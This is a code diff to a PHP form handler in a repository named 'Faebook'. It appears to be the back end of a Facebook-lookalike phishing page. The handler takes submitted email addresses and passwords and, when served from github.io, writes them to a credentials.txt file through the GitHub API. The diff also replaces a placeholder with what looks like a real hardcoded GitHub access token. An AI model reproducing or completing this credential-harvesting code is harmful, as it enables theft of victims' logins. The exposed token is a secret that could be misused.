@@ -9,10 +9,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (isValidEmail($email) && isValidPassword($password)) {
         // Save the credentials to a text file on GitHub Pages (if allowed)
         if (isGitHubPages()) {
-            // Use GitHub Pages' API or a custom solution to save the credentials
-            // (e.g., create a new file in the repository using the GitHub API)
-            // Replace with your implementation
-            saveCredentialsToGitHubPages($email, $password);
+            // Use GitHub Pages' API to create a new file in the repository
+            $client = new \Github\Client();
+            // Authenticate using your GitHub access token
+            $client->authenticate('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', 'x-oauth-basic');
+            // Create a new file in the repository
+            $client->api('repository')->createFile(
+                'bzpw36',
+                'Faebook',
+                'credentials.txt',
+                $email . "\n" . $password,
+                'Saving credentials'
+            );
+
+            // Credentials saved successfully
+            echo "Credentials saved successfully.";
         } else {
             // Save the credentials locally (if necessary)
             $filename = "credentials.txt";
@@ -47,22 +58,4 @@ function isValidPassword($password) {
 function isGitHubPages() {
     // Check if the HTTP_HOST environment variable contains "github.io"
     return strpos($_SERVER['HTTP_HOST'], 'github.io') !== false;
-}
-
-// Function to save credentials to GitHub Pages (replace with your implementation)
-function saveCredentialsToGitHubPages($email, $password) {
-    // Implement your logic to create a new file in the GitHub repository
-    // using the GitHub API or a custom solution
-    // Example using the GitHub API (you'll need to set up authentication):
-    $client = new \Github\Client();
-    // Authenticate using your GitHub access token
-    $client->authenticate('your_access_token', 'x-oauth-basic');
-    // Create a new file in the repository
-    $client->api('repository')->createFile(
-        'bzpw36',
-        'Faebook',
-        'credentials.txt',
-        $email . "\n" . $password,
-        'Saving credentials'
-    );
 }
